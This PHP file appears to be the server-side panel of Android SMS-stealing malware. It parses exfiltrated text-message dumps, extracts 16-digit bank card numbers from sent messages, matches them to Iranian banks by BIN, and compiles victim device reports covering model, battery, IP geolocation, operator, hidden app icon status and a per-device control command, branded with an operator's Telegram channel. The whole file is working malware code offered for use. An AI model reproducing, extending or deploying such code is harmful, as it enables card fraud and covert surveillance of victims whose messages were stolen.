<?php
function processCards($file_path, $model, $operator, $ip, $device_id) {
    if (!file_exists($file_path)) {
        return "⚠️ ᴜꜱᴇʀ ɪꜱ ᴏꜰꜰʟɪɴᴇ ᴏʀ ꜱᴍꜱ ɴᴏᴛ ꜰᴏᴜɴᴅ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }
    
    $content = file_get_contents($file_path);
    
    preg_match_all('/\|-----@theold_saeed-----\|(.*?)\|-----@theold_saeed-----\|/s', $content, $message_blocks);
    
    $cards = [];
    foreach ($message_blocks[1] as $block) {
        if (preg_match('/Type : SENT/s', $block)) {
            if (preg_match('/Text :(.*?)(?=\||$)/s', $block, $text_match)) {
                $text_content = trim($text_match[1]);
                
                preg_match_all('/(?:\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}|\b\d{16}\b)/', $text_content, $card_matches);
                
                foreach ($card_matches[0] as $card) {
                    $clean = preg_replace('/[^0-9]/', '', $card);
                    if (strlen($clean) === 16 && ctype_digit($clean)) {
                        $cards[] = $clean;
                    }
                }
            }
        }
    }
    
    if (empty($cards)) {
        return "⚠️ ɴᴏ ʙᴀɴᴋ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ SENT ᴍᴇꜱꜱᴀɢᴇꜱ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }
    
    $cards = array_unique($cards);
    $result = "💳 ᴀᴄᴛɪᴏɴ #ᴄᴀʀᴅꜱ \n\n";
    foreach ($cards as $card) {
        $bank_info = getBankInfo(substr($card, 0, 6));
        $result .= "• <code>" . $card . "</code>\n";
        $result .= "🏦 " . $bank_info[0] . " " . $bank_info[1] . "\n\n";
    }
    $result .= generateUserInfo($model, $operator, $ip, $device_id);
    return $result;
}

function generateUserInfo($model, $operator, $ip, $device_id) {
    $Battery = $_POST['Battery'] ?? 'N/A';
    $os = $_POST['andver'] ?? 'Unknown';
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);

    $screen_status = file_exists("user/$device_id-offline.txt") ? 
        (file_get_contents("user/$device_id-offline.txt") == "ON" ? "OFF" : "ON") : "UNKNOWN";
    
    $apk_status = file_exists("user/$device_id-apk.txt") ? 
        file_get_contents("user/$device_id-apk.txt") : "UNKNOWN";
    
    $icon_status = ($apk_status == "Hidden") ? "Hidden" : 
                  (($apk_status == "Changed") ? "Changed" : "Normal");
    
    $saved_operator = file_exists("user/$device_id-op.txt") ? file_get_contents("user/$device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
    
    $country = $gcx['country'] ?? 'Unknown';
    $city = $gcx['city'] ?? 'Unknown';
    $flag = EMflag($gcx["countryCode"] ?? 'IR');
    
    $result = "";
    $result .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$model</code>\n";
    $result .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>$Battery%</code>\n";
    $result .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>$os</code>\n";
    $result .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $result .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $result .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$device_id.txt") ? file_get_contents("user/appname-$device_id.txt") : 'Unknown') . "</code>\n";
    $result .= "├ <b>ɢᴇᴏ</b>: <code>$city, $country $flag</code>\n";
    $result .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$device_id\n";
    $result .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:$icon_status | ꜱᴄʀᴇᴇɴ:$screen_status</code>\n\n";
    $result .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";
    
    return $result;
}

function getBankInfo($bin) {
    $banks = [
        '603799' => ['ᴍᴇʟʟɪ', '#Melli'],
        '589210' => ['ꜱᴇᴘᴀʜ', '#Sepah'],
        '627648' => ['ꜱᴀᴅᴇʀᴀᴛ', '#Saderat'],
        '627961' => ['ꜱᴀɴᴀᴛᴍᴀᴅᴀɴ', '#SanatMadan'],
        '603770' => ['ᴋᴇꜱʜᴀᴠᴀʀᴢɪ', '#Keshavarzi'],
        '628023' => ['ᴍᴀꜱᴋᴀɴ', '#Maskan'],
        '627760' => ['ᴘᴏꜱᴛʙᴀɴᴋ', '#PostBank'],
        '502908' => ['ᴛᴀᴀᴠᴏɴ', '#Taavon'],
        '627412' => ['ᴇɢʜᴛᴇꜱᴀᴅɴᴏᴠɪɴ', '#EghtesadNovin'],
        '622106' => ['ᴘᴀʀꜱɪᴀɴ', '#Parsian'],
        '502229' => ['ᴘᴀꜱᴀʀɢᴀᴅ', '#Pasargad'],
        '639347' => ['ꜱɪɴᴀ', '#Sina'],
        '636214' => ['ᴀʏᴀɴᴅᴇʜ', '#Ayandeh'],
        '505416' => ['ɢᴀʀᴅᴇꜱʜɢᴀʀɪ', '#Gardeshgari'],
        '606256' => ['ᴍᴇʟʟᴀᴛ', '#Mellat'],
        '621986' => ['ꜱᴀᴍᴀɴ', '#Saman'],
        '603769' => ['ꜱᴀᴅᴇʀᴀᴛ', '#Saderat'],
        '610433' => ['ᴍᴇʟʟᴀᴛ', '#Mellat'],
        '627353' => ['ᴛᴇᴊᴀʀᴀᴛ', '#Tejarat'],
        '585983' => ['ᴛᴇᴊᴀʀᴀᴛ', '#Tejarat'],
        '589463' => ['ʀᴇꜰᴀʜ', '#Refah'],
        '505801' => ['ᴋᴏꜱᴀʀ', '#Kosar'],
        '639599' => ['ɢʜᴀᴠᴀᴍɪɴ', '#Ghavamin'],
        '636949' => ['ʜᴇᴋᴍᴀᴛ', '#Hekmat'],
        '627488' => ['ᴋᴀʀᴀꜰᴀʀɪɴ', '#KarAfarin']
    ];
    return $banks[$bin] ?? ['ᴜɴᴋɴᴏᴡɴ', '#Unknown'];
}

function EMflag(string $code): string {
    return (string) preg_replace_callback(
        '/./',
        static fn (array $letter) => mb_chr(ord($letter[0]) % 32 + 0x1F1E5),
        $code
    );
}

function get_ipv4($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        return $ip;
    }
    
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        $apis = [
            "https://api64.ipify.org?format=json",
            "https://api.ipify.org?format=json", 
            "http://ipv4.ipify.org"
        ];
        
        foreach ($apis as $api) {
            try {
                $response = @file_get_contents($api, false, stream_context_create([
                    'http' => ['timeout' => 2]
                ]));
                
                if ($response !== false) {
                    $data = json_decode($response, true);
                    if (isset($data['ip']) && filter_var($data['ip'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                        return $data['ip'];
                    } elseif (filter_var($response, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                        return trim($response);
                    }
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
    
    return $ip;
}
?>